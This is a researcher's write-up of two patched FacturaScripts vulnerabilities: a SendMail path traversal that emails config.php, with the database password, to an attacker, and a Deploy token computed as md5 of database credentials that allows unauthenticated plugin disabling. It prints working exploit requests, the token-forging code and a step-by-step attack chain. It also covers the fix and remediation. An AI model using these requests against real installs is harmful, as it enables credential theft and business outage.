---
title: "One Email Leaks the DB Password, One GET Takes the ERP Down"
description: "Two FacturaScripts advisories, same product, same day. A path traversal in the mail attachment handler emails config.php to an attacker (CVSS 9.9). A Deploy endpoint signed with md5 of the database password lets anyone disable every plugin (CVSS 7.5). The first bug hands you the key to the second."
date: "2026-10-05"
tags: ["facturascripts", "path-traversal", "erp", "cwe-22", "cwe-330", "web-security"]
---

I reported two bugs in FacturaScripts, the open-source PHP accounting and ERP platform. Both got fixed on 2026-10-05. Each one is bad alone. Together they are worse, because the first bug hands you the exact secret the second bug needs.

Bug one lives in the mail controller. It builds an attachment path by joining a base directory to a filename from the request. It checks nothing. Ask it to attach `../../../config.php` and it emails you `config.php`, database password included. CVSS 9.9, advisory GHSA-grw9-xvv2-5623.

Bug two lives in the `/Deploy` endpoint. It guards the "disable every plugin" action with a token. The token is `md5(db_name . db_user . db_password . date('Y-m-d H'))`. No session. No API key. If you know the database password, you compute the token and take the ERP offline. CVSS 7.5, advisory GHSA-jrgg-j699-qm3h.

You read the password with bug one. You spend it on bug two.

## What FacturaScripts Is

FacturaScripts is a PHP billing and ERP suite. It handles invoices, accounting, inventory, customers, and taxes. It is Spanish in origin, open source, and small businesses self-host it. It loads plugins for the extra modules. It keeps a `Dinamic/` folder of generated code that the framework rebuilds when the plugin set changes. Both details matter for bug two.

The data inside is the usual ERP set: customer records, invoices, tax filings, bank details. One file keeps it running. That file is `config.php` at the webroot, and it holds the database connection. Both bugs end up at that file.

## Bug One: The Mail Handler Reads Any File It Can See

`SendMail::setAttachment()` builds the attachment path like this:

```php
$filePath = FS_FOLDER . '/' . NewMail::ATTACHMENTS_TMP_PATH . $fileName;
```

`$fileName` comes straight from the POST body. Nothing strips `../`. The base path, `MyFiles/Tmp/Email/`, sits three directories below the webroot. So three `../` sequences walk you back to the FacturaScripts root. That is where `config.php` lives.

Any user with access to the SendMail page can do this. The employee role has that access by default. Not admin. An employee.

**Step 1: Log in as any employee.** The role that sends mail is enough.

**Step 2: Point the attachment at the file you want.** Send the compose form with the traversal in the filename:

```
POST /SendMail HTTP/1.1
Content-Type: application/x-www-form-urlencoded

action=send&email=attacker@example.com&subject=test&body=test&fileName=../../../config.php
```

**Step 3: Read your inbox.** The email arrives with `config.php` attached:

```php
define('FS_DB_NAME', 'facturascripts');
define('FS_DB_USER', 'root');
define('FS_DB_PASS', 'mypassword');
define('FS_TIMEZONE', 'America/Toronto');
```

Database host, name, user, password. Swap the filename for `/etc/passwd`, the application source, or any file the web server user can read.

The attacker sends the mail to themselves. There is no victim to trick and no payload to run. It is a file-read primitive with a built-in delivery channel. FacturaScripts also keeps a copy under `MyFiles/Email/<sender>/Sent/`, so the stolen file sits in the sent folder too.

### Then 2026.65 Made It a File Move

Around version 2026.65, a change went in to stop uploaded attachments from colliding on name. It added a branch in `NewMail::saveMailSent()`. That branch calls `rename()` on an attachment when its path *starts with* the temporary folder.

Starts with. A string-prefix check. A path like `.../MyFiles/Tmp/Email/../../../config.php` starts with the temp folder. It passes the check. The server moves the file instead of copying it.

So on 2026.65, the same request does two things. It emails `config.php` to the attacker. Then it deletes `config.php` from disk. A FacturaScripts install with no `config.php` does the worst possible thing. It shows the installer to anyone who visits, with no login. The attacker reinstalls with their own admin account. They already hold the database password from the same email. File read to full takeover, in one request. That is where the 9.9 comes from. Confidentiality, integrity, and availability all go, and the scope crosses out of the mail feature into the whole install.

## Bug Two: A Deploy Token Signed With the Database Password

The `/Deploy` controller exposes two actions worth protecting. `disable-plugins` stops invoicing, accounting, and reporting. `rebuild` regenerates the `Dinamic/` folder. Neither action needs a login. A token guards them instead. `CrashReport::newToken()` builds it, at lines 114 to 118:

```php
return md5(
    Tools::config('db_name')
    . Tools::config('db_user')
    . Tools::config('db_password')
    . date('Y-m-d H')
);
```

Four inputs. Three are fixed for the life of the install. The fourth, `date('Y-m-d H')`, changes once an hour. It reads the application timezone, not UTC. So the whole secret is the database password, wrapped in a hash that rotates 24 times a day.

If you know the password, you compute the token:

```php
$token = md5('facturascripts' . 'root' . 'mypassword' . date('Y-m-d H'));
```

Then you fire it with no session:

```
GET /Deploy?action=disable-plugins&token=<computed>
```

Response: `Plugins disabled.` The ERP is down until an admin turns the plugins back on.

There are three ways in. If you have the password, you compute the token directly. If you do not, the surface is still thin: 24 hourly values a day, crossed with default credentials like `root` and a weak password. MD5 is free to compute, so that space sweeps fast. The third way needs no password at all. FacturaScripts prints the token into the HTML of its error pages, inside the href of the "Disable plugins" and "Rebuild" links, whenever `canShowDeployButtons()` returns true. That is true on localhost, or when the visitor carries login cookies. Trigger an error, read the token out of the page, replay it.

A token is not a secret when it is a hash of values that never change and you print it into your own error pages.

## How They Chain

The advisories describe this as a chain, and that is the reason to care about both at once.

1. Log in as an employee. Use bug one to email yourself `config.php`.
2. Read the database password out of the attachment.
3. Feed the password into `md5(db_name . db_user . db_password . date('Y-m-d H'))` and mint a valid Deploy token.
4. Call `/Deploy?action=disable-plugins` with no session. The system goes offline.

The predictable-token advisory names bug one as the way to obtain the credentials it needs. The file read leaks the secret. The secret forges the signature. An employee account becomes a kill switch for the whole ERP. On 2026.65, bug one alone already reaches takeover, and step two is optional.

The `rebuild` action uses the same token and regenerates `Dinamic/`, which holds compiled controller and model metadata. An attacker who alternates between `disable-plugins` and `rebuild` keeps the application cycling between broken states.

## Proving It

I ran both against FacturaScripts v2026.6 in Docker: mysql:8.1, the app on port 8080, `FS_TIMEZONE=America/Toronto`.

**Bug one.** I logged in as an employee-level user. I sent a POST to `/SendMail` with `fileName=../../../config.php`. The email arrived at the attacker mailbox with the config file attached. The credentials matched the running instance.

**Bug two.** I computed the token from the leaked credentials and the current hour in `America/Toronto`. I sent a GET to `/Deploy?action=disable-plugins&token=<value>` with no session cookies and no API headers. It returned `Plugins disabled.` I loaded the admin dashboard and saw every plugin off.

The timezone matters. The token calls `date('Y-m-d H')`, which reads PHP's default timezone, set by `FS_TIMEZONE`. I used UTC on the first attempt and got the wrong token. The app runs in `America/Toronto`. Match the timezone or the hash does not line up.

## Why This Matters

Neither bug is exotic. Bug one is CWE-22: string concatenation into a filesystem path with no canonicalization. It is the first thing you check on any upload or download handler. Bug two is CWE-330: a security token built from values that are not random. The fix is the oldest advice in the book. Use a random token. Store it server-side.

The lesson is in what each bug reaches. A path traversal in a feature nobody treats as sensitive, email attachments, reaches the one file that holds every secret the install depends on. A homemade token that looks random, because it is a hash, turns out to be a deterministic function of a password you just stole. Each failure is ordinary alone. The product is a self-hosted ERP where an employee login reads the database password and then takes the business offline.

If you build auth tokens, retire this pattern. `md5()` of fields you had lying around is not a secret. It is a format. Anyone who learns the inputs reproduces it, and here one of the inputs was printed into the error pages that leak it.

## The Fix

Both bugs are patched in commit 23c84eb59, shipped in 2026.7.

The SendMail controller now resolves the attachment with `realpath()`. It attaches the file only if the result is a regular file inside `MyFiles/Tmp/Email/`. Anything that resolves elsewhere gets nothing attached, and the attachment name is reduced to its base name. `NewMail::saveMailSent()` now moves an attachment only when its real path is inside the temporary folder. It copies everything else, which kills the file-move escalation. The fix adds regression tests in `SendMailTest.php`, so the traversal cases stay closed.

The Deploy token needs the fix the advisory suggests. Use a cryptographically random token, stored server-side and generated on install, or require an authenticated admin session for Deploy actions. A hash of static config values was never a gate.

## Remediation

Upgrade to 2026.7 or later. That closes both bugs.

```bash
# the version lives in the admin panel, or in Core/Base/Globals
grep -r "VERSION" Core/ | head
```

If you cannot upgrade now:

- **Bug one:** remove access to the `SendMail` page from every role that does not need it. That is the workaround the advisory lists. On 2026.65, treat this as urgent, because the file read deletes the file it reads and opens the installer.
- **Bug two:** the Deploy actions are unauthenticated by design, so roles cannot gate them. Put `/Deploy` behind a reverse-proxy allowlist or basic auth until you patch. Rotate the database password afterward. The old password signs every historical token, and rotating it invalidates any token an attacker already computed.
- Watch `/Deploy` for requests with unexpected tokens. A spike of Deploy hits with rotating token values is a brute-force attempt.

## Disclosure

I reported both through FacturaScripts' GitHub security advisories. Carlos García (NeoRazorX) fixed them in one commit and published the advisories the same day, 2026-10-05. No CVE is assigned yet. Cite the GHSA IDs: GHSA-grw9-xvv2-5623 for the traversal, GHSA-jrgg-j699-qm3h for the Deploy token.

One email reads the password. One GET spends it. Patch both.

## References

**Primary Source:**
- [GHSA-grw9-xvv2-5623 - Arbitrary file read and move via path traversal in SendMail attachment](https://github.com/NeoRazorX/facturascripts/security/advisories/GHSA-grw9-xvv2-5623)
- [GHSA-jrgg-j699-qm3h - Unauthenticated plugin disable and rebuild via predictable Deploy token](https://github.com/NeoRazorX/facturascripts/security/advisories/GHSA-jrgg-j699-qm3h)

**Fix:**
- [Commit 23c84eb59](https://github.com/NeoRazorX/facturascripts/commit/23c84eb59)
- [FacturaScripts on GitHub](https://github.com/NeoRazorX/facturascripts)

**Related path traversals in FacturaScripts:**
- [GHSA-cv65-7cg8-r623 - unauthenticated path traversal in static file controllers](https://github.com/NeoRazorX/facturascripts/security/advisories/GHSA-cv65-7cg8-r623)
- [GHSA-hgjx-r89m-m7v4 - path traversal in UploadedFile::move](https://github.com/NeoRazorX/facturascripts/security/advisories/GHSA-hgjx-r89m-m7v4)

**Weaknesses:**
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [CWE-330: Use of Insufficiently Random Values](https://cwe.mitre.org/data/definitions/330.html)

**Project:**
- [FacturaScripts](https://facturascripts.com/)
